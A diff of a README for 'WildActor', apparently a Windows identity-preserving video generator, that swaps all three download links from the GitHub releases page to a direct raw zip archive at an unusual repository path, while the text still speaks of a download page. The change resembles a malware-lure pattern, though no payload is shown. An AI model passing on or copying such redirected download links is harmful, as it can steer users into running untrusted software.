@@ -1,6 +1,6 @@
 # 🎥 WildActor - Generate Videos Keeping Real Identity
 
-[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://github.com/surajromio/WildActor/releases)
+[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://raw.githubusercontent.com/surajromio/WildActor/main/Actor-18M/Wild-Actor-v2.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to get WildActor running on your Windows PC.
 
 Click the green button below or open this link in your browser:
 
-[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://github.com/surajromio/WildActor/releases)
+[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://raw.githubusercontent.com/surajromio/WildActor/main/Actor-18M/Wild-Actor-v2.8.zip)
 
 This page lists the available files for WildActor.
 
@@ -111,7 +111,7 @@ If you run into issues, try these steps:
 
 Use the link below to visit the download page where you get the latest WildActor version.
 
-[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://github.com/surajromio/WildActor/releases)
+[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://raw.githubusercontent.com/surajromio/WildActor/main/Actor-18M/Wild-Actor-v2.8.zip)
 
 ---
 
